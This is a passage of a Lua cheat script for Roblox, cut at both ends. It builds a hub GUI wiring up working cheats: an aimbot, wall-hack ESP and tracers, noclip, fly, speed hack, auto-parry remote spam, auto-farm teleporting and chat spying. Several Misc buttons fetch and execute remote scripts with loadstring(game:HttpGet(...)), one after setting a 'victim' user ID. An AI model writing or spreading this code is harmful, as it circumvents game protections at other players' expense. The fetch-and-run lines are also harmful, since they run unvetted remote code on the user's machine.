	portrait.BackgroundColor3 = CONFIG.WHITE
	portrait.Image = CONFIG.LAUFEY_IMAGE_ID
	portrait.ScaleType = Enum.ScaleType.Crop
	portrait.ZIndex = 4
	portrait.Parent = ring
	round(portrait, 42)

	local hubTitle = label(hub, "LAUFEY'S HUB", 15, Enum.Font.Michroma, CONFIG.INK, 3)
	hubTitle.AnchorPoint = Vector2.new(0.5, 0)
	hubTitle.Position = UDim2.new(0.5, 0, 0, 110)
	hubTitle.Size = UDim2.new(1, -20, 0, 20)
	hubTitle.TextXAlignment = Enum.TextXAlignment.Center

	local subtitle = label(hub, "♪ now playing · laufey", 10, Enum.Font.Ubuntu, CONFIG.ACCENT, 3)
	subtitle.AnchorPoint = Vector2.new(0.5, 0)
	subtitle.Position = UDim2.new(0.5, 0, 0, 130)
	subtitle.Size = UDim2.new(1, -20, 0, 14)
	subtitle.TextXAlignment = Enum.TextXAlignment.Center

	-- ── TAB BAR ──
	local TAB_NAMES = { "Combat", "Player", "Visual", "Misc" }
	local tabBar = Instance.new("Frame")
	tabBar.AnchorPoint = Vector2.new(0.5, 0)
	tabBar.Position = UDim2.new(0.5, 0, 0, 150)
	tabBar.Size = UDim2.new(1, -20, 0, 26)
	tabBar.BackgroundColor3 = CONFIG.PANEL_2
	tabBar.BorderSizePixel = 0
	tabBar.ZIndex = 3
	tabBar.Parent = hub
	round(tabBar, 8)

	local tabBtns = {}
	local tabPages = {}
	local activeTab = nil

	-- content area
	local contentArea = Instance.new("Frame")
	contentArea.AnchorPoint = Vector2.new(0.5, 0)
	contentArea.Position = UDim2.new(0.5, 0, 0, 182)
	contentArea.Size = UDim2.new(1, -20, 0, 356)
	contentArea.BackgroundTransparency = 1
	contentArea.ZIndex = 3
	contentArea.ClipsDescendants = true
	contentArea.Parent = hub

	local function makeTab(name, idx)
		local btn = Instance.new("TextButton")
		btn.Size = UDim2.new(0.25, 0, 1, 0)
		btn.Position = UDim2.new((idx - 1) * 0.25, 0, 0, 0)
		btn.BackgroundColor3 = CONFIG.PANEL_2
		btn.AutoButtonColor = false
		btn.Text = name
		btn.Font = Enum.Font.GothamMedium
		btn.TextSize = 10
		btn.TextColor3 = CONFIG.MUTED
		btn.BorderSizePixel = 0
		btn.ZIndex = 4
		btn.Parent = tabBar
		if idx == 1 then round(btn, 8) elseif idx == 4 then round(btn, 8) end
		tabBtns[name] = btn

		local page = Instance.new("Frame")
		page.Size = UDim2.fromScale(1, 1)
		page.BackgroundTransparency = 1
		page.Visible = false
		page.ZIndex = 3
		page.Parent = contentArea
		tabPages[name] = page
		return page
	end

	local function switchTab(name)
		for n, p in pairs(tabPages) do
			p.Visible = n == name
			tween(tabBtns[n], 0.15, {
				BackgroundColor3 = n == name and CONFIG.ACCENT or CONFIG.PANEL_2,
				TextColor3 = n == name and CONFIG.WHITE or CONFIG.MUTED,
			})
		end
		activeTab = name
	end

	for i, name in ipairs(TAB_NAMES) do
		makeTab(name, i)
		tabBtns[name].MouseButton1Click:Connect(function() switchTab(name) end)
	end

	-- helper to place buttons inside a tab page
	local function tabBtn(page, text, y, state)
		return makeButton(page, text, y, state and CONFIG.ON or CONFIG.OFF)
	end
	local function tabInput(page, lbl, y, val)
		return makeInputRow(page, lbl, y, val)
	end
	local function tog(btn, key, onText, offText)
		btn.MouseButton1Click:Connect(function()
			getgenv()[key] = not getgenv()[key]
			btn.Text = getgenv()[key] and onText or offText
			tween(btn, 0.2, { BackgroundColor3 = getgenv()[key] and CONFIG.ON or CONFIG.DANGER })
		end)
	end

	-- ════════════════════ COMBAT TAB ════════════════════
	local combatPage = tabPages["Combat"]

	local aimBtn   = tabBtn(combatPage, "Aimbot: ON",     4,  true)
	local fovBtn   = tabBtn(combatPage, "Show FOV: ON",   36, true)
	local silBtn   = tabBtn(combatPage, "Silent Aim: OFF",68, false)
	local espBtn   = tabBtn(combatPage, "ESP: ON", 100, true)
	espBtn.Visible = false
	local parryBtn = tabBtn(combatPage, "Auto Parry: OFF", 132, false)
	parryBtn.Visible = false

	local smoothBox = tabInput(combatPage, "Smoothness", 166, getgenv().Smoothness)
	local fovBox    = tabInput(combatPage, "FOV radius",  198, getgenv().FOV)

	local tgtRow = Instance.new("Frame")
	tgtRow.AnchorPoint = Vector2.new(0.5, 0)
	tgtRow.Position = UDim2.new(0.5, 0, 0, 232)
	tgtRow.Size = UDim2.new(0, 216, 0, 26)
	tgtRow.BackgroundTransparency = 1
	tgtRow.ZIndex = 3
	tgtRow.Parent = combatPage

	local targetBtns = {}
	for i, mode in ipairs({ "Head", "Body", "Foot" }) do
		local b = Instance.new("TextButton")
		b.Size = UDim2.new(0, 70, 1, 0)
		b.Position = UDim2.new(0, (i - 1) * 74, 0, 0)
		b.AutoButtonColor = false
		b.Text = mode
		b.Font = Enum.Font.GothamMedium
		b.TextSize = 11
		b.TextColor3 = CONFIG.INK
		b.BackgroundColor3 = CONFIG.OFF
		b.ZIndex = 4
		b.Parent = tgtRow
		round(b, 7)
		targetBtns[mode] = b
	end

	local autoFarmBtn = tabBtn(combatPage, "Auto Farm: OFF", 266, false)
	autoFarmBtn.Visible = false

	-- ════════════════════ PLAYER TAB ════════════════════
	local playerPage = tabPages["Player"]

	local noclipBtn   = tabBtn(playerPage, "Noclip: OFF",      4,   false)
	local infJumpBtn  = tabBtn(playerPage, "Inf Jump: OFF",    36,  false)
	local speedBtn    = tabBtn(playerPage, "Speed Hack: OFF",  68,  false)
	speedBtn.Visible = false
	local flyBtn      = tabBtn(playerPage, "Fly: OFF",         68, false)
	local infStamBtn  = tabBtn(playerPage, "Inf Stamina: OFF", 100, false)
	infStamBtn.Visible = false
	local antiRagBtn  = tabBtn(playerPage, "Anti Ragdoll: OFF",132, false)
	antiRagBtn.Visible = false
	local wsBox       = tabInput(playerPage, "WalkSpeed",      164, getgenv().WalkSpeed)
	wsBox.Parent.Visible = false
	local flySpBox    = tabInput(playerPage, "Fly Speed",      164, getgenv().FlySpeed)
	local spdBox      = tabInput(playerPage, "Speed Val",      196, getgenv().SpeedVal)
	spdBox.Parent.Visible = false

	-- ════════════════════ VISUAL TAB ════════════════════
	local visualPage = tabPages["Visual"]

	local fullbrightBtn = tabBtn(visualPage, "Fullbright: OFF",    4,   false)
	fullbrightBtn.Visible = false
	local chatSpyBtn    = tabBtn(visualPage, "Chat Spy: OFF",      36,  false)
	chatSpyBtn.Visible = false

	-- font cycle
	local FONTS = {
		{ name = "Antique",     face = Font.fromEnum(Enum.Font.Antique) },
		{ name = "Michroma",    face = Font.fromEnum(Enum.Font.Michroma) },
		{ name = "Arcade",      face = Font.fromEnum(Enum.Font.Arcade) },
		{ name = "Creepster",   face = Font.fromEnum(Enum.Font.Creepster) },
		{ name = "IndieFlower", face = Font.fromEnum(Enum.Font.IndieFlower) },
		{ name = "Bangers",     face = Font.fromEnum(Enum.Font.Bangers) },
		{ name = "Oswald",      face = Font.fromEnum(Enum.Font.Oswald) },
		{ name = "Nunito",      face = Font.fromEnum(Enum.Font.Nunito) },
	}
	local espVisBtn = tabBtn(visualPage, "ESP: ON", 4, true)

	local fontIndex = 0
	local fracBtn = tabBtn(visualPage, "Font: OFF", 36, false)

	-- FOV color picker (cycle through colors)
	local FOV_COLORS = {
		Color3.fromRGB(186, 160, 240),
		Color3.fromRGB(246, 196, 226),
		Color3.fromRGB(100, 220, 255),
		Color3.fromRGB(255, 200, 100),
		Color3.fromRGB(100, 255, 150),
		Color3.fromRGB(255, 100, 130),
	}
	local fovColorIdx = 1
	local fovColorBtn = tabBtn(visualPage, "FOV Color: Purple", 36, true)

	-- ESP color
	local ESP_COLORS = {
		{ name = "Health",  r = nil },
		{ name = "White",   r = Color3.new(1,1,1) },
		{ name = "Red",     r = Color3.new(1,0.2,0.3) },
		{ name = "Cyan",    r = Color3.fromRGB(100,220,255) },
		{ name = "Yellow",  r = Color3.fromRGB(255,200,50) },
	}
	local espColorIdx = 1
	local espColorBtn = tabBtn(visualPage, "ESP Color: Health", 100, true)

	-- crosshair (spinning hexagram / star-of-david)
	local crosshairBtn = tabBtn(visualPage, "Crosshair: OFF", 132, false)
	local CHEX_COLOR   = Color3.fromRGB(100, 220, 255)  -- light blue
	local CHEX_R       = 14   -- half-size of each triangle (small)
	local CHEX_THICK   = 1.4
	local chexAngle    = 0    -- spinning angle
	-- 6 lines: triangle 1 = lines 1-3, triangle 2 = lines 4-6
	local chexLines = {}
	for i = 1, 6 do
		local l = Drawing.new("Line")
		l.Thickness    = CHEX_THICK
		l.Color        = CHEX_COLOR
		l.Transparency = 0.05
		l.Visible      = false
		chexLines[i]   = l
	end
	-- helper: get 3 rotated equilateral-triangle vertices
	local function triVerts(cx, cy, r, baseAngle)
		local v = {}
		for i = 0, 2 do
			local a = math.rad(baseAngle + i * 120)
			v[i+1] = Vector2.new(cx + r * math.cos(a), cy + r * math.sin(a))
		end
		return v
	end

	-- tracer
	local tracerBtn = tabBtn(visualPage, "Tracers: OFF", 164, false)
	getgenv().Tracers = false

	-- ════════════════════ MISC TAB ════════════════════
	local miscPage = tabPages["Misc"]

	local valHandsBtn = tabBtn(miscPage, "Val Hands", 4, false)
	valHandsBtn.MouseButton1Click:Connect(function()
		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/mrbeanissohot/Bean-sValorant/refs/heads/main/Valorant.lua", true))()
		end)
	end)

	local killSoundBtn = tabBtn(miscPage, "Andagi Kill Sound", 36, false)
	killSoundBtn.MouseButton1Click:Connect(function()
		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/betterthanbefore0207767837-cyber/Xgivfc/refs/heads/main/Ffvhhvxd", true))()
		end)
	end)

	local rivalsSpoofBtn = tabBtn(miscPage, "Rivals Spoof", 68, false)
	rivalsSpoofBtn.MouseButton1Click:Connect(function()
		pcall(function()
			getgenv().Config = {
				victim    = 11480709640,
				helper    = "",
				level     = 45648,
				streak    = 15765,
				elo       = 0,
				keys      = 67,
				premium   = false,
				verified  = false,
				unlockall = false,
				platform  = "VR",
				join      = "discord.gg/rivalscomp"
			}
			loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))()
		end)
	end)

	local alyaBtn = tabBtn(miscPage, "Alya Texture", 100, false)
	alyaBtn.MouseButton1Click:Connect(function()
		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/betterthanbefore0207767837-cyber/Fggb/refs/heads/main/Fgnn"))()
		end)
	end)

	local closeBtn = tabBtn(miscPage, "Close Hub", 132, false)
	tween(closeBtn, 0, { BackgroundColor3 = CONFIG.DANGER })

	-- ── floating show/hide button ──
	local toggleBtn = Instance.new("TextButton")
	toggleBtn.AnchorPoint = Vector2.new(0, 0)
	toggleBtn.Position = UDim2.new(0, 16, 0, 16)
	toggleBtn.Size = UDim2.new(0, 110, 0, 30)
	toggleBtn.BackgroundColor3 = CONFIG.WHITE
	toggleBtn.AutoButtonColor = false
	toggleBtn.Text = "Hide GUI"
	toggleBtn.Font = Enum.Font.Montserrat
	toggleBtn.TextSize = 12
	toggleBtn.TextColor3 = CONFIG.INK
	toggleBtn.ZIndex = 10
	toggleBtn.Parent = root
	round(toggleBtn, 9)
	stroke(toggleBtn, CONFIG.ACCENT, 1, 0.4)

	do
		local dragging, dragStart, startPos, moved = false, nil, nil, false
		toggleBtn.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				dragging = true; moved = false; dragStart = input.Position; startPos = toggleBtn.Position
			end
		end)
		toggleBtn.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
		end)
		UserInputService.InputChanged:Connect(function(input)
			if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
				local d = input.Position - dragStart
				if d.Magnitude > 4 then moved = true end
				toggleBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
			end
		end)
		toggleBtn.MouseButton1Click:Connect(function() if moved then moved = false return end end)
	end

	local guiVisible = true
	toggleBtn.MouseButton1Click:Connect(function()
		guiVisible = not guiVisible
		hub.Visible = guiVisible
		toggleBtn.Text = guiVisible and "Hide GUI" or "Show GUI"
	end)

	switchTab("Combat")

	-- ── wire up Combat ──
	local function refreshTargets()
		for mode, b in pairs(targetBtns) do
			tween(b, 0.2, { BackgroundColor3 = getgenv().TargetMode == mode and CONFIG.ON or CONFIG.OFF })
		end
	end
	for mode, b in pairs(targetBtns) do
		b.MouseButton1Click:Connect(function() getgenv().TargetMode = mode; refreshTargets() end)
	end
	refreshTargets()

	tog(aimBtn,   "Aimbot",   "Aimbot: ON",      "Aimbot: OFF")
	tog(fovBtn,      "ShowFOV", "Show FOV: ON",  "Show FOV: OFF")
	tog(espBtn,      "ESP",     "ESP: ON",       "ESP: OFF")
	tog(espVisBtn,   "ESP",     "ESP: ON",       "ESP: OFF")
	-- keep both buttons in sync
	espVisBtn.MouseButton1Click:Connect(function()
		espBtn.Text = getgenv().ESP and "ESP: ON" or "ESP: OFF"
		tween(espBtn, 0.2, { BackgroundColor3 = getgenv().ESP and CONFIG.ON or CONFIG.OFF })
	end)
	tog(silBtn,   "SilentAim","Silent Aim: ON",  "Silent Aim: OFF")
	tog(parryBtn, "AutoParry","Auto Parry: ON",  "Auto Parry: OFF")
	tog(autoFarmBtn,"AutoFarm","Auto Farm: ON",  "Auto Farm: OFF")

	smoothBox.FocusLost:Connect(function()
		getgenv().Smoothness = tonumber(smoothBox.Text) or getgenv().Smoothness
		smoothBox.Text = tostring(getgenv().Smoothness)
	end)
	fovBox.FocusLost:Connect(function()
		getgenv().FOV = tonumber(fovBox.Text) or getgenv().FOV
		fovBox.Text = tostring(getgenv().FOV)
	end)

	-- ── wire up Player ──
	-- noclip
	tog(noclipBtn, "Noclip", "Noclip: ON", "Noclip: OFF")
	RunService.Stepped:Connect(function()
		if not running then return end
		if getgenv().Noclip then
			local char = lp.Character
			if char then
				for _, p in ipairs(char:GetDescendants()) do
					if p:IsA("BasePart") then p.CanCollide = false end
				end
			end
		end
	end)

	-- inf jump
	tog(infJumpBtn, "InfJump", "Inf Jump: ON", "Inf Jump: OFF")
	UserInputService.JumpRequest:Connect(function()
		if not running then return end
		if getgenv().InfJump then
			local char = lp.Character
			local hum = char and char:FindFirstChildOfClass("Humanoid")
			if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
		end
	end)

	-- speed hack
	tog(speedBtn, "Speedhack", "Speed Hack: ON", "Speed Hack: OFF")
	wsBox.FocusLost:Connect(function()
		getgenv().WalkSpeed = tonumber(wsBox.Text) or 16
		wsBox.Text = tostring(getgenv().WalkSpeed)
		local char = lp.Character
		local hum = char and char:FindFirstChildOfClass("Humanoid")
		if hum then hum.WalkSpeed = getgenv().WalkSpeed end
	end)
	spdBox.FocusLost:Connect(function()
		getgenv().SpeedVal = tonumber(spdBox.Text) or 24
		spdBox.Text = tostring(getgenv().SpeedVal)
	end)
	RunService.Heartbeat:Connect(function()
		if not running then return end
		if getgenv().Speedhack then
			local char = lp.Character
			local hum = char and char:FindFirstChildOfClass("Humanoid")
			if hum then hum.WalkSpeed = getgenv().SpeedVal end
		end
	end)

	-- fly
	tog(flyBtn, "FlyEnabled", "Fly: ON", "Fly: OFF")
	flySpBox.FocusLost:Connect(function()
		getgenv().FlySpeed = tonumber(flySpBox.Text) or 60
		flySpBox.Text = tostring(getgenv().FlySpeed)
	end)
	local flyBodyVel, flyBodyGyro
	local flyConn
	flyBtn.MouseButton1Click:Connect(function()
		if getgenv().FlyEnabled then
			local char = lp.Character
			local hrp  = char and char:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
			flyBodyVel = Instance.new("BodyVelocity")
			flyBodyVel.Velocity = Vector3.zero
			flyBodyVel.MaxForce = Vector3.new(1e5,1e5,1e5)
			flyBodyVel.Parent = hrp
			flyBodyGyro = Instance.new("BodyGyro")
			flyBodyGyro.MaxTorque = Vector3.new(1e5,1e5,1e5)
			flyBodyGyro.P = 1e4
			flyBodyGyro.Parent = hrp
			flyConn = RunService.Heartbeat:Connect(function()
				if not running or not getgenv().FlyEnabled then
					if flyBodyVel then flyBodyVel:Destroy() flyBodyVel = nil end
					if flyBodyGyro then flyBodyGyro:Destroy() flyBodyGyro = nil end
					if flyConn then flyConn:Disconnect() flyConn = nil end
					return
				end
				local cf = cam.CFrame
				local vel = Vector3.zero
				local spd = getgenv().FlySpeed
				if UserInputService:IsKeyDown(Enum.KeyCode.W) then vel = vel + cf.LookVector * spd end
				if UserInputService:IsKeyDown(Enum.KeyCode.S) then vel = vel - cf.LookVector * spd end
				if UserInputService:IsKeyDown(Enum.KeyCode.A) then vel = vel - cf.RightVector * spd end
				if UserInputService:IsKeyDown(Enum.KeyCode.D) then vel = vel + cf.RightVector * spd end
				if UserInputService:IsKeyDown(Enum.KeyCode.Space) then vel = vel + Vector3.new(0, spd, 0) end
				if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then vel = vel - Vector3.new(0, spd, 0) end
				flyBodyVel.Velocity = vel
				flyBodyGyro.CFrame = cf
			end)
		else
			if flyBodyVel then flyBodyVel:Destroy() flyBodyVel = nil end
			if flyBodyGyro then flyBodyGyro:Destroy() flyBodyGyro = nil end
			if flyConn then flyConn:Disconnect() flyConn = nil end
		end
	end)

	-- inf stamina
	tog(infStamBtn, "InfStamina", "Inf Stamina: ON", "Inf Stamina: OFF")
	RunService.Heartbeat:Connect(function()
		if not running or not getgenv().InfStamina then return end
		local char = lp.Character
		if not char then return end
		for _, v in ipairs(char:GetDescendants()) do
			if v.Name:lower():find("stamina") and v:IsA("NumberValue") then
				pcall(function() v.Value = v:GetAttribute("MaxStamina") or 100 end)
			end
		end
	end)

	-- anti ragdoll
	tog(antiRagBtn, "AntiRagdoll", "Anti Ragdoll: ON", "Anti Ragdoll: OFF")
	RunService.Heartbeat:Connect(function()
		if not running or not getgenv().AntiRagdoll then return end
		local char = lp.Character
		local hum = char and char:FindFirstChildOfClass("Humanoid")
		if hum then
			pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
		end
	end)

	-- auto parry heartbeat
	RunService.Heartbeat:Connect(function()
		if not running or not getgenv().AutoParry then return end
		local char = lp.Character
		if not char then return end
		-- fire any remote named parry/block
		for _, v in ipairs(game:GetDescendants()) do
			if v:IsA("RemoteEvent") and (v.Name:lower():find("parry") or v.Name:lower():find("block")) then
				pcall(function() v:FireServer() end)
			end
		end
	end)

	-- auto farm heartbeat
	RunService.Heartbeat:Connect(function()
		if not running or not getgenv().AutoFarm then return end
		local char = lp.Character
		if not char then return end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if not hrp then return end
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr ~= lp and plr.Character then
				local tHRP = plr.Character:FindFirstChild("HumanoidRootPart")
				local tHum = plr.Character:FindFirstChildOfClass("Humanoid")
				if tHRP and tHum and tHum.Health > 0 then
					hrp.CFrame = CFrame.new(tHRP.Position + Vector3.new(0, 0, 3))
					break
				end
			end
		end
	end)

	-- ── wire up Visual ──
	-- fullbright
	tog(fullbrightBtn, "Fullbright", "Fullbright: ON", "Fullbright: OFF")
	local origAmbient, origOutdoor
	fullbrightBtn.MouseButton1Click:Connect(function()
		if getgenv().Fullbright then
			origAmbient = game:GetService("Lighting").Ambient
			origOutdoor = game:GetService("Lighting").OutdoorAmbient
			game:GetService("Lighting").Ambient        = Color3.new(1, 1, 1)
			game:GetService("Lighting").OutdoorAmbient = Color3.new(1, 1, 1)
			game:GetService("Lighting").Brightness     = 2
		else
			if origAmbient then game:GetService("Lighting").Ambient        = origAmbient end
			if origOutdoor then game:GetService("Lighting").OutdoorAmbient = origOutdoor end
			game:GetService("Lighting").Brightness = 1
		end
	end)

	-- chat spy
	tog(chatSpyBtn, "ChatSpy", "Chat Spy: ON", "Chat Spy: OFF")
	Players.PlayerAdded:Connect(function(p)
		p.Chatted:Connect(function(msg)
			if running and getgenv().ChatSpy then
				local l = Instance.new("Message")
				l.Text = "[" .. p.Name .. "]: " .. msg
				l.Parent = workspace
				game:GetService("Debris"):AddItem(l, 4)
			end
		end)
	end)
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= lp then
			p.Chatted:Connect(function(msg)
				if running and getgenv().ChatSpy then
					local l = Instance.new("Message")
					l.Text = "[" .. p.Name .. "]: " .. msg
					l.Parent = workspace
					game:GetService("Debris"):AddItem(l, 4)
				end
			end)
		end
	end

	-- font changer
	local originalFaces = {}
	local function gatherTextObjects()
		local out = {}
		local pg = lp:FindFirstChildOfClass("PlayerGui")
		if pg then
			for _, obj in ipairs(pg:GetDescendants()) do
				if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox"))
					and not obj:FindFirstAncestor("ArjayHub") then
					table.insert(out, obj)
				end
			end
		end
		for _, obj in ipairs(workspace:GetDescendants()) do
			if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
				table.insert(out, obj)
			end
		end
		pcall(function()
			for _, obj in ipairs(game:GetService("CoreGui"):GetDescendants()) do
				if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox"))
					and not obj:FindFirstAncestor("ArjayHub") then
					table.insert(out, obj)
				end
			end
		end)
		return out
	end
	local function applyFont(face)
		for _, obj in ipairs(gatherTextObjects()) do
			if face then
				if originalFaces[obj] == nil then originalFaces[obj] = obj.FontFace end
				pcall(function() obj.FontFace = face end)
			elseif originalFaces[obj] ~= nil then
				pcall(function() obj.FontFace = originalFaces[obj] end)
			end
		end
	end
	fracBtn.MouseButton1Click:Connect(function()
		fontIndex = (fontIndex % #FONTS) + 1
		local f = FONTS[fontIndex]
		if f then
			applyFont(f.face)
			fracBtn.Text = "Font: " .. f.name
			tween(fracBtn, 0.2, { BackgroundColor3 = CONFIG.ON })
		else
			applyFont(nil)
			fracBtn.Text = "Font: OFF"
			tween(fracBtn, 0.2, { BackgroundColor3 = CONFIG.OFF })
			fontIndex = 0
		end
	end)

	-- fov color
	fovColorBtn.MouseButton1Click:Connect(function()
		fovColorIdx = (fovColorIdx % #FOV_COLORS) + 1
		local c = FOV_COLORS[fovColorIdx]
		cir.Color = c
		local names = {"Purple","Pink","Cyan","Orange","Green","Red"}
		fovColorBtn.Text = "FOV Color: " .. names[fovColorIdx]
	end)

	-- esp color
	espColorBtn.MouseButton1Click:Connect(function()
		espColorIdx = (espColorIdx % #ESP_COLORS) + 1
		espColorBtn.Text = "ESP Color: " .. ESP_COLORS[espColorIdx].name
	end)

	-- crosshair toggle
	crosshairBtn.MouseButton1Click:Connect(function()
		getgenv().Crosshair = not (getgenv().Crosshair or false)
		crosshairBtn.Text = getgenv().Crosshair and "Crosshair: ON" or "Crosshair: OFF"
		tween(crosshairBtn, 0.2, { BackgroundColor3 = getgenv().Crosshair and CONFIG.ON or CONFIG.DANGER })
		for _, l in ipairs(chexLines) do l.Visible = getgenv().Crosshair end
	end)
	getgenv().Crosshair = false

	-- tracer toggle
	tog(tracerBtn, "Tracers", "Tracers: ON", "Tracers: OFF")

	-- ESP Box button
	local espBoxBtn = tabBtn(visualPage, "ESP Box: OFF", 196, false)
	tog(espBoxBtn, "ESPBox", "ESP Box: ON", "ESP Box: OFF")

	-- Drawing pools for boxes and tracers
	local espBoxDrawings   = {}  -- [player] = { top, bot, left, right }
	local tracerDrawings   = {}  -- [player] = Line

	local function getOrCreateBox(player)
		if not espBoxDrawings[player] then
			local lines = {}
			for i = 1, 4 do
				local l = Drawing.new("Line")
				l.Thickness = 1.5
				l.Transparency = 0
				l.Visible = false
				lines[i] = l
			end
			espBoxDrawings[player] = lines
		end
		return espBoxDrawings[player]
	end

	local function getOrCreateTracer(player)
		if not tracerDrawings[player] then
			local l = Drawing.new("Line")
			l.Thickness = 1.2
			l.Transparency = 0.15
			l.Visible = false
			tracerDrawings[player] = l
		end
		return tracerDrawings[player]
	end

	local function removePlayerDrawings(player)
		if espBoxDrawings[player] then
			for _, l in ipairs(espBoxDrawings[player]) do pcall(function() l:Remove() end) end
			espBoxDrawings[player] = nil
		end
		if tracerDrawings[player] then
			pcall(function() tracerDrawings[player]:Remove() end)
			tracerDrawings[player] = nil
		end
	end

	-- FOV circle + aimbot (first-person gated)
	local cam_ = cam
	local cir = Drawing.new("Circle")
	cir.Thickness = 1.5
	cir.Color = Color3.fromRGB(186, 160, 240)
	cir.Transparency = 0.6
	cir.Visible = true

	local VP = workspace.CurrentCamera.ViewportSize

	local rsConn = RunService.RenderStepped:Connect(function()
		if not running then return end
		VP = workspace.CurrentCamera.ViewportSize
		cir.Visible = getgenv().ShowFOV and guiVisible
		cir.Radius  = getgenv().FOV
		cir.Position = UserInputService:GetMouseLocation()

		-- spinning hexagram crosshair
		if getgenv().Crosshair then
			chexAngle = chexAngle + 1.2  -- degrees per frame, spin speed
			local mp = UserInputService:GetMouseLocation()
			local cx, cy = mp.X, mp.Y
			local v1 = triVerts(cx, cy, CHEX_R, chexAngle)
			local v2 = triVerts(cx, cy, CHEX_R, chexAngle + 180)
			-- triangle 1: lines 1-3
			chexLines[1].From = v1[1]; chexLines[1].To = v1[2]
			chexLines[2].From = v1[2]; chexLines[2].To = v1[3]
			chexLines[3].From = v1[3]; chexLines[3].To = v1[1]
			-- triangle 2: lines 4-6
			chexLines[4].From = v2[1]; chexLines[4].To = v2[2]
			chexLines[5].From = v2[2]; chexLines[5].To = v2[3]
			chexLines[6].From = v2[3]; chexLines[6].To = v2[1]
		end

		-- ESP Boxes + Tracers (Drawing API)
		for _, v in ipairs(Players:GetPlayers()) do
			if v == lp or not v.Character then
				if espBoxDrawings[v] then
					for _, l in ipairs(espBoxDrawings[v]) do l.Visible = false end
				end
				if tracerDrawings[v] then tracerDrawings[v].Visible = false end
			else
				local char = v.Character
				local hrp  = char:FindFirstChild("HumanoidRootPart")
				local head = char:FindFirstChild("Head")
				local hum  = char:FindFirstChild("Humanoid")
				local alive = hum and hum.Health > 0

				-- pick color
				local col
				local ec = ESP_COLORS[espColorIdx]
				if ec.r then
					col = ec.r
				elseif hum then
					local t = hum.Health / math.max(hum.MaxHealth, 1)
					col = Color3.fromRGB(math.floor((1-t)*255), math.floor(t*200), 60)
				else
					col = Color3.new(1,1,1)
				end

				-- ESP BOX
				if getgenv().ESPBox and hrp and head then
					local lines = getOrCreateBox(v)
					-- project root and head to screen to get height
					local rootSP, rootOnScreen = cam_:WorldToViewportPoint(hrp.Position)
					local headSP, headOnScreen = cam_:WorldToViewportPoint(head.Position + Vector3.new(0, 0.7, 0))
					if rootOnScreen and headOnScreen and alive then
						local h = math.abs(rootSP.Y - headSP.Y) * 1.2
						local w = h * 0.5
						local cx = headSP.X
						local top = headSP.Y - (h * 0.1)
						local bot = top + h
						local lft = cx - w * 0.5
						local rgt = cx + w * 0.5
						-- top, bottom, left, right lines
						-- top bar
						lines[1].From = Vector2.new(lft, top); lines[1].To = Vector2.new(rgt, top)
						-- bot bar
						lines[2].From = Vector2.new(lft, bot); lines[2].To = Vector2.new(rgt, bot)
						-- left bar
						lines[3].From = Vector2.new(lft, top); lines[3].To = Vector2.new(lft, bot)
						-- right bar
						lines[4].From = Vector2.new(rgt, top); lines[4].To = Vector2.new(rgt, bot)
						for _, l in ipairs(lines) do l.Color = col; l.Visible = true end
					else
						for _, l in ipairs(lines) do l.Visible = false end
					end
				elseif espBoxDrawings[v] then
					for _, l in ipairs(espBoxDrawings[v]) do l.Visible = false end
				end

				-- TRACER
				if getgenv().Tracers and hrp then
					local tracer = getOrCreateTracer(v)
					local sp, onScreen = cam_:WorldToViewportPoint(hrp.Position)
					if onScreen and alive then
						tracer.From = Vector2.new(VP.X * 0.5, VP.Y)
						tracer.To   = Vector2.new(sp.X, sp.Y)
						tracer.Color = col
						tracer.Visible = true
					else
						tracer.Visible = false
					end
				elseif tracerDrawings[v] then
					tracerDrawings[v].Visible = false
				end
			end
		end

		-- aimbot only fires in first-person
		if UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)
			and getgenv().Aimbot
			and isFirstPerson() then

			local best, bestDist = nil, getgenv().FOV
			local m = UserInputService:GetMouseLocation()

			for _, v in ipairs(Players:GetPlayers()) do
				if v ~= lp and v.Character
					and v.Character:FindFirstChild("Humanoid")
					and v.Character.Humanoid.Health > 0 then
					local pt = getTargetPart(v.Character, getgenv().TargetMode)
					if pt then
						local pos, onScreen = cam_:WorldToViewportPoint(pt.Position)
						if onScreen then
							local mag = (Vector2.new(pos.X, pos.Y) - m).Magnitude
							if mag < bestDist then
								bestDist = mag
								best = pt
							end
						end
					end
				end
			end

			if best and mousemoverel then
				local pos = cam_:WorldToViewportPoint(best.Position)
				local ml  = UserInputService:GetMouseLocation()
				mousemoverel(
					(pos.X - ml.X) * getgenv().Smoothness,
					(pos.Y - ml.Y) * getgenv().Smoothness
				)
			end
		end
	end)

	-- ESP
	local function trackPlayer(player)
		if player == lp then return end

		local lbl, highlight, hpConn, diedConn

		local function cleanup()
			if hpConn then hpConn:Disconnect() hpConn = nil end
			if diedConn then diedConn:Disconnect() diedConn = nil end
			if lbl and lbl.Parent then lbl.Parent:Destroy() lbl = nil end
			if highlight then highlight:Destroy() highlight = nil end
		end

		local function setup(character)
			cleanup()
			local head
			repeat
				task.wait(0.1)
				if not character or not character.Parent then return end
				head = character:FindFirstChild("Head")
			until head or not running

			if not running or not head then return end

			lbl = createOverheadGui(head)
			highlight = Instance.new("Highlight")
			highlight.Name = "HealthHighlight"
			highlight.FillTransparency = 0.8
			highlight.OutlineTransparency = 0
			highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight.Parent = character

